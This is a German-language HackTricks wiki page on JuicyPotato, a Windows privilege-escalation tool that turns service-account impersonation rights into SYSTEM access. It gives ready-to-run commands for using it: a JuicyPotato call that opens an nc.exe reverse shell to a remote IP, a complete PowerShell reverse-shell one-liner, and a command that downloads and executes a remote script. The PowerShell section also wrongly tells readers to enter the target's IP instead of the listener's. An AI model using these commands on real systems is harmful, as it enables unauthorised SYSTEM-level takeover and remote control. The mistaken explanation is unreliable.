# JuicyPotato

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

{% hint style="warning" %}
**JuicyPotato funktioniert nicht** unter Windows Server 2019 und Windows 10 Build 1809 und höher. Jedoch können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) verwendet werden, um **die gleichen Berechtigungen zu nutzen und Zugriff auf `NT AUTHORITY\SYSTEM`** zu erlangen. _**Überprüfen Sie:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (Ausnutzung der goldenen Berechtigungen) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Eine gesüßte Version von_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, mit einem Schuss Saft, d.h. **ein weiteres Tool zur Eskalation der lokalen Berechtigungen, von einem Windows-Dienstbenutzer zu NT AUTHORITY\SYSTEM**_

#### Sie können JuicyPotato von [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) herunterladen

### Zusammenfassung <a href="#summary" id="summary"></a>

**[Aus der Juicy-Potato-Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) und seine [Varianten](https://github.com/decoder-it/lonelypotato) nutzen die Eskalationskette der Berechtigungen basierend auf dem [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx)-[Dienst](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), der den MiTM-Listener auf `127.0.0.1:6666` hat und wenn Sie `SeImpersonate`- oder `SeAssignPrimaryToken`-Berechtigungen haben. Bei einer Überprüfung des Windows-Builds haben wir eine Konfiguration gefunden, bei der `BITS` absichtlich deaktiviert war und der Port `6666` belegt war.

Wir haben uns entschieden, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu weaponisieren: **Sagen Sie hallo zu Juicy Potato**.

> Für die Theorie siehe [Rotten Potato - Privilege Escalation von Service Accounts zu SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folgen Sie der Kette von Links und Referenzen.

Wir haben entdeckt, dass es neben `BITS` noch mehrere COM-Server gibt, die wir missbrauchen können. Sie müssen nur:

1. instanziierbar durch den aktuellen Benutzer sein, normalerweise ein "Service-Benutzer", der Übernahmeberechtigungen hat
2. das `IMarshal`-Interface implementieren
3. als erhöhter Benutzer (SYSTEM, Administrator, ...) ausgeführt werden

Nach einigen Tests haben wir eine umfangreiche Liste von [interessanten CLSID's](http://ohpe.it/juicy-potato/CLSID/) auf mehreren Windows-Versionen erhalten und getestet.

### Saftige Details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ermöglicht es Ihnen:

* **Ziel-CLSID** _wählen Sie eine beliebige CLSID aus._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _finden Sie die Liste nach Betriebssystemen sortiert._
* **COM-Listening-Port** _definieren Sie den bevorzugten COM-Listening-Port (anstelle des fest codierten 6666)_
* **COM-Listening-IP-Adresse** _binden Sie den Server an eine beliebige IP_
* **Prozesserstellungmodus** _je nach Übernahmeberechtigungen des übernommenen Benutzers können Sie auswählen:_
* `CreateProcessWithToken` (benötigt `SeImpersonate`)
* `CreateProcessAsUser` (benötigt `SeAssignPrimaryToken`)
* `beide`
* **Zu startender Prozess** _starten Sie eine ausführbare Datei oder ein Skript, wenn die Ausnutzung erfolgreich ist_
* **Prozessargument** _passen Sie die Argumente des gestarteten Prozesses an_
* **RPC-Serveradresse** _für einen unauffälligen Ansatz können Sie sich an einen externen RPC-Server authentifizieren_
* **RPC-Serverport** _nützlich, wenn Sie sich an einen externen Server authentifizieren möchten und die Firewall den Port `135` blockiert..._
* **TEST-Modus** _hauptsächlich für Testzwecke, d.h. zum Testen von CLSID's. Es erstellt den DCOM und gibt den Benutzer des Tokens aus. Siehe_ [_hier zum Testen_](http://ohpe.it/juicy-potato/Test/)

### Verwendung <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Abschließende Gedanken <a href="#final-thoughts" id="final-thoughts"></a>

**[Aus dem juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

Wenn der Benutzer über die Berechtigungen `SeImpersonate` oder `SeAssignPrimaryToken` verfügt, sind Sie **SYSTEM**.

Es ist nahezu unmöglich, den Missbrauch all dieser COM-Server zu verhindern. Sie könnten darüber nachdenken, die Berechtigungen dieser Objekte über `DCOMCNFG` zu ändern, aber viel Glück, das wird eine Herausforderung sein.

Die eigentliche Lösung besteht darin, sensible Konten und Anwendungen zu schützen, die unter den `* SERVICE`-Konten ausgeführt werden. Das Stoppen von `DCOM` würde sicherlich diesen Exploit behindern, könnte jedoch ernsthafte Auswirkungen auf das zugrunde liegende Betriebssystem haben.

Von: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Beispiele

Hinweis: Besuchen Sie [diese Seite](https://ohpe.it/juicy-potato/CLSID/) für eine Liste von CLSIDs, die Sie ausprobieren können.

### Erhalten Sie eine umgekehrte Shell mit nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell Rückverbindung

Powershell bietet eine leistungsstarke Möglichkeit, eine Rückverbindung zu einem entfernten System herzustellen. Dies kann nützlich sein, um eine Remote-Shell auf einem Zielcomputer zu erhalten und verschiedene Aktionen auszuführen.

Um eine Powershell-Rückverbindung herzustellen, können Sie den folgenden Befehl verwenden:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-Adresse', Port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"
```

Ersetzen Sie "IP-Adresse" durch die IP-Adresse des Zielcomputers und "Port" durch den gewünschten Port für die Rückverbindung.

Nachdem Sie den Befehl ausgeführt haben, wird eine Rückverbindung zum Zielcomputer hergestellt und Sie erhalten eine Powershell-Shell, mit der Sie Befehle ausführen können.

Bitte beachten Sie, dass das Herstellen einer Rückverbindung zu einem entfernten System ohne Zustimmung des Eigentümers illegal sein kann. Stellen Sie sicher, dass Sie über die erforderlichen Berechtigungen verfügen, bevor Sie diese Technik anwenden.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Starten Sie eine neue CMD (wenn Sie RDP-Zugriff haben)

![](<../../.gitbook/assets/image (37).png>)

## CLSID-Probleme

Oftmals funktioniert die standardmäßige CLSID, die JuicyPotato verwendet, **nicht** und der Exploit schlägt fehl. In der Regel sind mehrere Versuche erforderlich, um eine **funktionierende CLSID** zu finden. Um eine Liste von CLSIDs für ein bestimmtes Betriebssystem zu erhalten, sollten Sie diese Seite besuchen:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Überprüfen von CLSIDs**

Zunächst benötigen Sie einige ausführbare Dateien neben juicypotato.exe.

Laden Sie [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und laden Sie es in Ihre PS-Sitzung. Laden Sie dann [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) herunter und führen Sie es aus. Dieses Skript erstellt eine Liste möglicher CLSIDs zum Testen.

Laden Sie dann [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) herunter (ändern Sie den Pfad zur CLSID-Liste und zur juicypotato-Ausführungsdatei) und führen Sie es aus. Es wird versuchen, jede CLSID auszuführen, und **wenn sich die Portnummer ändert, bedeutet dies, dass die CLSID funktioniert**.

**Überprüfen** Sie die funktionierenden CLSIDs **mit dem Parameter -c**

## Referenzen
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF-Download** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>
